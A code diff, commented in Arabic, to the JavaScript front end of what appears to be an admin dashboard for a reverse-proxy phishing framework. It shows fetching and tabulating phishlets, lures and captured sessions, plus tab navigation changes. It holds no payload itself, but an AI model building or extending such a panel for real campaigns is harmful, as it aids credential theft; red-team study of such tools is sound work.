@@ -136,9 +136,13 @@ async function fetchPhishlets() {
             };
         }
         
-        phishlets = await response.json();
+        const result = await response.json();
+        // تجهيز البيانات بالتنسيق المناسب
+        phishlets = Array.isArray(result) ? result : (result.data || []);
+        console.log('تم استلام Phishlets:', phishlets);
         return phishlets;
     } catch (error) {
+        console.error('خطأ في جلب Phishlets:', error);
         handleApiError(error);
         return [];
     }
@@ -159,9 +163,13 @@ async function fetchLures() {
             };
         }
         
-        lures = await response.json();
+        const result = await response.json();
+        // تجهيز البيانات بالتنسيق المناسب
+        lures = Array.isArray(result) ? result : (result.data || []);
+        console.log('تم استلام Lures:', lures);
         return lures;
     } catch (error) {
+        console.error('خطأ في جلب Lures:', error);
         handleApiError(error);
         return [];
     }
@@ -182,9 +190,13 @@ async function fetchSessions() {
             };
         }
         
-        sessions = await response.json();
+        const result = await response.json();
+        // تجهيز البيانات بالتنسيق المناسب
+        sessions = Array.isArray(result) ? result : (result.data || []);
+        console.log('تم استلام Sessions:', sessions);
         return sessions;
     } catch (error) {
+        console.error('خطأ في جلب Sessions:', error);
         handleApiError(error);
         return [];
     }
@@ -353,7 +365,7 @@ function populatePhishletsTable(phishlets) {
     const tbody = phishletsTable.querySelector('tbody');
     tbody.innerHTML = '';
     
-    if (phishlets.length === 0) {
+    if (!phishlets || phishlets.length === 0) {
         const tr = document.createElement('tr');
         tr.innerHTML = `<td colspan="5" class="text-center">لا توجد phishlets</td>`;
         tbody.appendChild(tr);
@@ -362,15 +374,21 @@ function populatePhishletsTable(phishlets) {
     
     phishlets.forEach(phishlet => {
         const tr = document.createElement('tr');
+        // تأكد من أن جميع الخصائص المطلوبة موجودة
+        const name = phishlet.name || phishlet.id || '';
+        const author = phishlet.author || '';
+        const domains = phishlet.domains || phishlet.proxyHosts || [];
+        const enabled = phishlet.enabled === true;
+        
         tr.innerHTML = `
-            <td>${phishlet.name}</td>
-            <td>${phishlet.author}</td>
-            <td>${phishlet.proxyHosts ? phishlet.proxyHosts.join(', ') : ''}</td>
-            <td><span class="badge ${phishlet.enabled ? 'badge-success' : 'badge-danger'}">${phishlet.enabled ? 'مفعل' : 'معطل'}</span></td>
+            <td>${name}</td>
+            <td>${author}</td>
+            <td>${Array.isArray(domains) ? domains.join(', ') : domains}</td>
+            <td><span class="badge ${enabled ? 'badge-success' : 'badge-danger'}">${enabled ? 'مفعل' : 'معطل'}</span></td>
             <td class="action-buttons">
-                <button class="btn btn-sm ${phishlet.enabled ? 'btn-danger' : 'btn-success'}" data-action="${phishlet.enabled ? 'disable' : 'enable'}" data-name="${phishlet.name}">
-                    <i class="fas fa-${phishlet.enabled ? 'power-off' : 'play'}"></i>
-                    ${phishlet.enabled ? 'تعطيل' : 'تفعيل'}
+                <button class="btn btn-sm ${enabled ? 'btn-danger' : 'btn-success'}" data-action="${enabled ? 'disable' : 'enable'}" data-name="${name}">
+                    <i class="fas fa-${enabled ? 'power-off' : 'play'}"></i>
+                    ${enabled ? 'تعطيل' : 'تفعيل'}
                 </button>
             </td>
         `;
@@ -684,24 +702,35 @@ navLinks.forEach(link => {
     link.addEventListener('click', function(e) {
         e.preventDefault();
         
-        // تحديد التبويب النشط
-        navLinks.forEach(item => item.parentElement.classList.remove('active'));
-        this.parentElement.classList.add('active');
+        // إزالة الفئة النشطة من جميع الروابط
+        document.querySelectorAll('.sidebar-nav a').forEach(a => {
+            a.classList.remove('active');
+        });
         
-        // إظهار المحتوى المناسب
-        const targetId = this.getAttribute('href').substring(1);
-        tabContents.forEach(content => content.classList.remove('active'));
-        document.getElementById(targetId).classList.add('active');
+        // إضافة الفئة النشطة إلى الرابط الحالي
+        this.classList.add('active');
         
-        // تحديث بيانات التبويب عند النقر عليه
-        if (targetId === 'phishlets-tab') {
-            fetchPhishlets().then(data => populatePhishletsTable(data));
-        } else if (targetId === 'lures-tab') {
-            fetchLures().then(data => populateLuresTable(data));
-        } else if (targetId === 'sessions-tab') {
-            fetchSessions().then(data => populateSessionsTable(data));
-        } else if (targetId === 'dashboard-tab') {
-            updateDashboard();
+        // إخفاء جميع محتويات التبويبات
+        document.querySelectorAll('.tab-content').forEach(tab => {
+            tab.style.display = 'none';
+        });
+        
+        // إظهار محتوى التبويب المطلوب
+        const targetId = this.getAttribute('data-target');
+        const targetTab = document.getElementById(targetId);
+        if (targetTab) {
+            targetTab.style.display = 'block';
+            
+            // تحديث البيانات بناءً على التبويب النشط
+            if (targetId === 'phishlets-tab') {
+                fetchPhishlets().then(data => populatePhishletsTable(data));
+            } else if (targetId === 'lures-tab') {
+                fetchLures().then(data => populateLuresTable(data));
+            } else if (targetId === 'sessions-tab') {
+                fetchSessions().then(data => populateSessionsTable(data));
+            } else if (targetId === 'dashboard-tab') {
+                updateDashboard();
+            }
         }
     });
 });
@@ -746,14 +775,65 @@ document.addEventListener('DOMContentLoaded', function() {
     // التحقق من حالة تسجيل الدخول
     checkAuthentication();
     
+    // تحديث البيانات فور تحميل الصفحة
+    updateDashboard();
+    
     // تفعيل التبويب الافتراضي (لوحة القيادة)
     document.querySelector('.sidebar-nav li:first-child a').click();
     
-    // تحديث البيانات كل دقيقة
+    // إضافة معالج الأحداث للتبويبات
+    document.querySelectorAll('.sidebar-nav a').forEach(link => {
+        link.addEventListener('click', function(e) {
+            e.preventDefault();
+            
+            // إزالة الفئة النشطة من جميع الروابط
+            document.querySelectorAll('.sidebar-nav a').forEach(a => {
+                a.classList.remove('active');
+            });
+            
+            // إضافة الفئة النشطة إلى الرابط الحالي
+            this.classList.add('active');
+            
+            // إخفاء جميع محتويات التبويبات
+            document.querySelectorAll('.tab-content').forEach(tab => {
+                tab.style.display = 'none';
+            });
+            
+            // إظهار محتوى التبويب المطلوب
+            const targetId = this.getAttribute('data-target');
+            const targetTab = document.getElementById(targetId);
+            if (targetTab) {
+                targetTab.style.display = 'block';
+                
+                // تحديث البيانات بناءً على التبويب النشط
+                if (targetId === 'phishlets-tab') {
+                    fetchPhishlets().then(data => populatePhishletsTable(data));
+                } else if (targetId === 'lures-tab') {
+                    fetchLures().then(data => populateLuresTable(data));
+                } else if (targetId === 'sessions-tab') {
+                    fetchSessions().then(data => populateSessionsTable(data));
+                } else if (targetId === 'dashboard-tab') {
+                    updateDashboard();
+                }
+            }
+        });
+    });
+    
+    // تحديث البيانات كل 30 ثانية
     setInterval(function() {
-        // فقط إذا كان تبويب لوحة القيادة نشطًا
-        if (document.getElementById('dashboard-tab').classList.contains('active')) {
-            updateDashboard();
+        // تحديث البيانات بناءً على التبويب النشط
+        const activeTab = document.querySelector('.sidebar-nav a.active');
+        if (activeTab) {
+            const targetId = activeTab.getAttribute('data-target');
+            if (targetId === 'phishlets-tab') {
+                fetchPhishlets().then(data => populatePhishletsTable(data));
+            } else if (targetId === 'lures-tab') {
+                fetchLures().then(data => populateLuresTable(data));
+            } else if (targetId === 'sessions-tab') {
+                fetchSessions().then(data => populateSessionsTable(data));
+            } else if (targetId === 'dashboard-tab') {
+                updateDashboard();
+            }
         }
-    }, 60000);
+    }, 30000);
 }); 
